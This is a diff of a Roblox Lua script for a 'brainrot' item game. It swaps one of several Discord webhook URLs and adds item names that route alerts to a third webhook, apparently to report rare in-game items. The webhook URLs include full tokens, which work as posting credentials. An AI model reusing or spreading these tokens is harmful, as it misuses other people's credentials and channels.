@@ -8,7 +8,7 @@ if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
     "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b",
-    "https://discord.com/api/webhooks/1397994822396149890/k7gMoTUoiEFaR4733ymwSKjRd5iVfwhiCyWRDNbltfvPSKQHQpWpIr5GxCOfkSx-kWRd"
+    "https://discord.com/api/webhooks/1398580759442231307/YEYvSzOrWKPo_uw-xSSwgIqfl1zXK47fLf93NOTB1Jtsux3bnTWjRR0OWygEwZD4yDSl"
 }
 
 local extraWebhookUrl = "https://discord.com/api/webhooks/1396804813471350874/RHDbjxnu6lvkgahhNXZWKuoYU6lZOff6BcvOud5hhSnw_hUXX1h_EP00jmnt3n8bhQKp"
@@ -49,9 +49,13 @@ local brainrotRanks = {
 }
 
 local specialForThirdWebhook = {
-    ["Garama and Madundung"]     = true,
+    ["Garama And Madundung"]     = true,
     ["Nuclearo Dinossauro"]      = true,
     ["La Grande Combinasion"]    = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Secret Lucky Block"] = true,
+    ["Pot Hotspot"] = true,
+    ["Graipuss Medussi"] = true,
 }
 
 local colorGold     = Color3.fromRGB(237, 178, 0)
